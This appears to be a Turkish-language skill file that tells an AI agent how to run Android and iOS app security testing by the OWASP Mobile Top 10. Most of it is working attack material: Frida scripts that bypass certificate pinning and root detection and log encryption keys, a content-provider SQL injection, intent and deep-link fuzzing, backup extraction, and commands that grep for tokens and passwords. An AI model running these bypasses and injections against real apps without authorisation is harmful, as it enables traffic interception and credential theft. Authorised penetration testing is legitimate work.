---
name: mobile-security
description: "Android ve iOS mobil uygulama güvenlik testi. APK statik/dinamik analiz, Frida hooking, sertifika pinning bypass, ADB enumeration ve OWASP Mobile Top 10 metodolojisi."
---

# Mobil Uygulama Güvenlik Testi Metodolojisi

Android APK veya iOS uygulama güvenlik testi yapıyorsun.
OWASP Mobile Top 10 saldırı yüzeyini sistematik tara.

---

## 1. Ortam Kurulumu

### Android Test Ortamı
```bash
# ADB kurulu mu?
adb devices                          # Bağlı cihazları listele
adb -s DEVICE_ID shell               # Shell aç

# Burp Suite sertifikasını Android'e yükle
adb push burp_ca.der /sdcard/
# Settings → Security → Install certificate → CA certificate

# Frida server kur (cihaz root ise)
FRIDA_VERSION=$(frida --version)
wget "https://github.com/frida/frida/releases/download/$FRIDA_VERSION/frida-server-$FRIDA_VERSION-android-arm64.xz"
xz -d frida-server*.xz
adb push frida-server /data/local/tmp/frida-server
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"
```

---

## 2. APK Edinme ve Hazırlık

```bash
# Yüklü uygulamadan APK çek
adb shell pm list packages | grep TARGET_APP
adb shell pm path com.target.app
adb pull /data/app/com.target.app-1/base.apk ./target.apk

# APKPure / APKMirror'dan indir (test için)
# veya jadx ile doğrudan URL'den
```

---

## 3. Statik Analiz

### 3.1 APK Yapısını Aç

```bash
# apktool — smali/manifest için
apktool d target.apk -o target_decompiled/
cat target_decompiled/AndroidManifest.xml

# jadx — Java kaynak kodu için (daha okunabilir)
jadx -d target_src/ target.apk
# jadx-gui ile görsel: jadx-gui target.apk
```

### 3.2 AndroidManifest.xml Analizi

```bash
# Exported activity/receiver/provider'ları bul → saldırı yüzeyi
grep -E "exported=\"true\"|android:exported" target_decompiled/AndroidManifest.xml

# Debuggable bayrak (kritik!)
grep "debuggable" target_decompiled/AndroidManifest.xml

# Backup izni
grep "allowBackup" target_decompiled/AndroidManifest.xml

# İzinler listesi
grep "uses-permission" target_decompiled/AndroidManifest.xml
```

### 3.3 Hardcoded Secret Tarama

```bash
cd target_src/

# API key, token, password aramak
grep -r -E "(api_key|apikey|api-key|secret|password|passwd|token|bearer)" \
  --include="*.java" --include="*.kt" -i | grep -v "test"

# AWS key
grep -r -E "AKIA[0-9A-Z]{16}" .

# Firebase URL
grep -r "firebaseapp.com\|firebase.io" .

# Private key
grep -r "BEGIN (RSA|EC|DSA|PRIVATE) KEY" .

# URL ve endpoint'ler
grep -r -E "https?://[a-zA-Z0-9./%-]+" . | grep -v "schemas.android\|w3.org"
```

### 3.4 Güvensiz Depolama Tespiti

```bash
# SharedPreferences dosyaları (cleartext olabilir)
grep -r "SharedPreferences\|getSharedPreferences" target_src/ --include="*.java"

# SQLite veritabanı kullanımı
grep -r "SQLiteDatabase\|openOrCreateDatabase\|getWritableDatabase" target_src/ --include="*.java"

# Dosyaya yazma (MODE_WORLD_READABLE eski ama kontrol et)
grep -r "openFileOutput\|MODE_WORLD" target_src/ --include="*.java"

# External storage (SD kart = herkes okuyabilir)
grep -r "getExternalStorage\|Environment.EXTERNAL" target_src/ --include="*.java"
```

### 3.5 SSL/TLS Güvensiz Kullanım

```bash
# Custom TrustManager (tüm sertifikalara güvenme)
grep -r "TrustManager\|X509TrustManager\|checkServerTrusted\|getAcceptedIssuers" \
  target_src/ --include="*.java"

# ALLOW_ALL_HOSTNAME_VERIFIER
grep -r "ALLOW_ALL_HOSTNAME_VERIFIER\|AllowAllHostnameVerifier" target_src/ --include="*.java"

# Network security config
cat target_decompiled/res/xml/network_security_config.xml 2>/dev/null
# clearTextTrafficPermitted="true" → cleartext HTTP izni
```

---

## 4. Dinamik Analiz — Frida

### 4.1 Sertifika Pinning Bypass

```javascript
// frida-pinning-bypass.js — Certificate Pinning'i devre dışı bırak
// Kullanım: frida -U -l frida-pinning-bypass.js -f com.target.app

Java.perform(function() {
    // OkHttp CertificatePinner bypass
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
            console.log('[*] CertificatePinner.check bypassed for: ' + hostname);
            return;
        };
    } catch(e) { console.log('OkHttp3 not found'); }

    // TrustManager override
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            console.log('[*] TrustManagerImpl.verifyChain bypassed for: ' + host);
            return untrustedChain;
        };
    } catch(e) { console.log('TrustManagerImpl not found'); }

    // WebView SSL error override
    try {
        var WebViewClient = Java.use('android.webkit.WebViewClient');
        WebViewClient.onReceivedSslError.implementation = function(webView, sslErrorHandler, sslError) {
            console.log('[*] WebView SSL error bypassed');
            sslErrorHandler.proceed();
        };
    } catch(e) {}
});
```

```bash
# Burp proxy ile birlikte çalıştır
adb shell settings put global http_proxy 192.168.1.100:8080
frida -U -l frida-pinning-bypass.js --no-pause -f com.target.app
```

### 4.2 Root Detection Bypass

```javascript
// frida-root-bypass.js
Java.perform(function() {
    // RootBeer kütüphanesi bypass
    try {
        var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
        RootBeer.isRooted.implementation = function() { return false; };
        RootBeer.isRootedWithoutBusyBox.implementation = function() { return false; };
    } catch(e) {}

    // Yaygın root kontrolleri
    try {
        var Runtime = Java.use('java.lang.Runtime');
        Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
            if (cmd.includes('su') || cmd.includes('which')) {
                cmd = 'ls'; // Zararsız komutla değiştir
            }
            return this.exec(cmd);
        };
    } catch(e) {}

    // File.exists('/system/bin/su') override
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        if (path.includes('su') || path.includes('supersu') || path.includes('magisk')) {
            console.log('[*] Root file check bypassed: ' + path);
            return false;
        }
        return this.exists();
    };
});
```

### 4.3 API Call Logging

```javascript
// frida-api-logger.js — tüm HTTP isteklerini log'la
Java.perform(function() {
    var OkHttpClient = Java.use('okhttp3.OkHttpClient');
    var Request = Java.use('okhttp3.Request');

    // OkHttp interceptor
    var chain_impl = Java.use('okhttp3.internal.connection.RealCall');
    if (chain_impl) {
        chain_impl.execute.implementation = function() {
            var request = this.request();
            console.log('[HTTP] ' + request.method() + ' ' + request.url());
            var headers = request.headers();
            if (headers.size() > 0) {
                console.log('[Headers] ' + headers.toString());
            }
            return this.execute();
        };
    }

    // Genel URL log
    var URL = Java.use('java.net.URL');
    URL.openConnection.overload().implementation = function() {
        console.log('[URL] openConnection: ' + this.toString());
        return this.openConnection();
    };
});
```

### 4.4 Şifreleme Analizi

```javascript
// frida-crypto-hook.js — şifreleme key/IV'lerini yakala
Java.perform(function() {
    var Cipher = Java.use('javax.crypto.Cipher');
    Cipher.init.overload('int', 'java.security.Key').implementation = function(opmode, key) {
        console.log('[Cipher] Mode: ' + opmode);
        console.log('[Cipher] Key: ' + Java.use('java.util.Arrays').toString(key.getEncoded()));
        return this.init(opmode, key);
    };

    var SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');
    SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(key, alg) {
        console.log('[SecretKeySpec] Algo: ' + alg + ' Key: ' + bytesToHex(key));
        return this.$init(key, alg);
    };

    function bytesToHex(bytes) {
        return Array.from(bytes).map(b => ('0' + (b & 0xFF).toString(16)).slice(-2)).join('');
    }
});
```

```bash
# Frida komutları
frida -U -l frida-pinning-bypass.js -f com.target.app       # Cold start
frida -U -l frida-api-logger.js com.target.app              # Running process
frida -U -l frida-crypto-hook.js --no-pause -f com.target.app
```

---

## 5. ADB Enumeration

```bash
# Uygulama veri dizinine eriş (root gerektirir)
adb shell "run-as com.target.app ls -la /data/data/com.target.app/"

# SharedPreferences okuma
adb shell "run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml"

# SQLite veritabanları
adb shell "run-as com.target.app ls /data/data/com.target.app/databases/"
adb shell "run-as com.target.app sqlite3 /data/data/com.target.app/databases/users.db '.tables'"
adb shell "run-as com.target.app sqlite3 /data/data/com.target.app/databases/users.db 'SELECT * FROM users;'"

# Logcat — uygulama log'ları (API key, token, hata mesajı olabilir)
adb logcat -s "com.target.app" --pid=$(adb shell pidof com.target.app)
adb logcat | grep -i -E "token|key|password|secret|error"

# Dump tüm aktiviteler
adb shell dumpsys activity activities | grep -A 5 "com.target.app"

# Network trafiği (tcpdump root gerektirir)
adb shell "tcpdump -i wlan0 -w /sdcard/traffic.pcap"
adb pull /sdcard/traffic.pcap
```

---

## 6. Content Provider Saldırıları

```bash
# Exported content provider'ları listele
adb shell dumpsys package com.target.app | grep -A 3 "Provider"

# Content provider'ı doğrudan sorgula
adb shell content query --uri "content://com.target.app.provider/users"
adb shell content query --uri "content://com.target.app.provider/credentials"

# SQL injection dene (path parametresi)
adb shell content query --uri "content://com.target.app.provider/users" \
  --where "1=1 UNION SELECT name,sql,1,1,1 FROM sqlite_master--"
```

---

## 7. Intent Fuzzing

```bash
# Exported activity'yi çalıştır
adb shell am start -n com.target.app/.LoginActivity

# Deep link test et
adb shell am start -a android.intent.action.VIEW -d "targetapp://login?token=PAYLOAD"

# Broadcast göndermek
adb shell am broadcast -a com.target.app.ACTION_UPDATE_CONFIG --es config '{"debug":true}'

# Fragment injection (activity'nin kabul ettiği fragmentleri dene)
adb shell am start -n com.target.app/.MainActivity \
  -e ':android:show_fragment' com.target.app.SettingsFragment
```

---

## 8. Android Backup Exploitation

```bash
# Uygulama verilerini yedekle (allowBackup=true ise)
adb backup -f target_backup.ab -noapk com.target.app

# Backup'ı extract et
java -jar android-backup-extractor.jar target_backup.ab target_backup.tar
mkdir backup_extracted && tar -xvf target_backup.tar -C backup_extracted/

# Credentials, database, SharedPreferences ara
find backup_extracted/ -name "*.xml" -o -name "*.db" -o -name "*.json" | xargs grep -i -E "token|password|key" 2>/dev/null
```

---

## 9. Network Proxy Kurulumu

```bash
# Android 7+ için Frida gerekir (sistem sertifikası olarak yükle)
# Root varsa:
adb push burp_cert.der /system/etc/security/cacerts/
adb shell "chmod 644 /system/etc/security/cacerts/burp_cert.der"

# Root yoksa — Frida ile TrustManager override (Yöntem 4.1)
# veya network_security_config.xml patch + apk repack

# Proxy ayarla
adb shell settings put global http_proxy 192.168.1.100:8080

# Proxy kaldır
adb shell settings delete global http_proxy
```

---

## 10. OWASP Mobile Top 10 Kontrol Listesi

| # | Zafiyet | Test Yöntemi |
|---|---|---|
| M1 | Improper Credential Usage | Logcat, SharedPreferences, SQLite tarama |
| M2 | Inadequate Supply Chain Security | APK imzası kontrol, bağımlılık tarama |
| M3 | Insecure Authentication/Authorization | Intent fuzzing, exported activity, deep link |
| M4 | Insufficient Input/Output Validation | Content provider SQLi, intent data manipulation |
| M5 | Insecure Communication | Sertifika pinning, cleartext HTTP, proxy ile intercept |
| M6 | Inadequate Privacy Controls | Permission analizi, veri sızıntısı, backup check |
| M7 | Insufficient Binary Protections | Decompile edilebilirlik, debug flag, root detection yok |
| M8 | Security Misconfiguration | AndroidManifest, network security config, debuggable |
| M9 | Insecure Data Storage | External storage, SharedPreferences cleartext, SQLite |
| M10 | Insufficient Cryptography | Custom TrustManager, hardcoded key, weak algo |

---

## 11. MCP Tool Referansı

```
# Kali araçlar (kali-tools hazır olduğunda)
mcp__kali-tools__shell_exec(cmd)
  → jadx target.apk, apktool d target.apk, frida komutları

# APK analiz araçları (Kali'de mevcut)
jadx, apktool, baksmali, dex2jar
frida, frida-tools, objection
adb (Android Debug Bridge)
```

---

## 12. Hızlı Başlangıç (Cheat Sheet)

```bash
# 1. APK edin
adb shell pm path com.target.app && adb pull PATH target.apk

# 2. Statik hızlı tarama
jadx -d src/ target.apk && grep -r -iE "api_key|password|secret" src/

# 3. Manifest kontrol
apktool d target.apk -o dec/ && cat dec/AndroidManifest.xml | grep -E "exported|debuggable|backup"

# 4. Proxy kur ve uygulamayı başlat
adb shell settings put global http_proxy 192.168.1.100:8080
frida -U -l frida-pinning-bypass.js -f com.target.app

# 5. Logcat izle
adb logcat | grep -i -E "token|password|error|exception"
```
